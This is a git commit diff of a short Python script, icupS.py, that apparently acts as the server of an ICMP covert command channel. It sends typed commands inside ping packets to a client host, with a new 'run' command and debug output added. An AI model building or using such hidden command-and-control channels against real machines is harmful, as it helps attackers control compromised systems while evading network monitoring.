cefa6d330be0af7095bb05b0b670d4e2a16fdea3
Anthony Ioppolo <20ioppolan@gmail.com>
2022-10-24 20:24:23 -0400

    added unused run command, fixed string after send

--- icupS.py
+++ icupS.py
@@ -1,18 +1,27 @@
 from scapy.all import * 
 from scapy.all import ICMP,IP
 
+CLIENT = "127.0.0.1"
+DEBUG = True
+
 def main():
     while(True):
         command = input(">> ")
-        arguments = command.split(" ")
+        arguments = command.split(" ",1 )
         if arguments[0] == "":
             continue
         elif arguments[0] == "kill":
             break
         elif arguments[0] == "send":
             clientcommand = arguments[1] 
-            evil = IP(dst="127.0.0.1")/ICMP(type=8)/(clientcommand)
+            evil = IP(dst=CLIENT)/ICMP(type=8)/(clientcommand)
             send(evil)
+            if DEBUG: print(f"[DEBUG] \"{clientcommand}\" sent to {CLIENT}")
+        elif arguments[0] == "run":
+            clientcommand = arguments[1] 
+            evil = IP(dst=CLIENT)/ICMP(type=8)/(clientcommand)
+            send(evil)
+            if DEBUG: print(f"[DEBUG] \"{clientcommand}\" sent to {CLIENT}")
 
 if __name__ == "__main__":
     main()
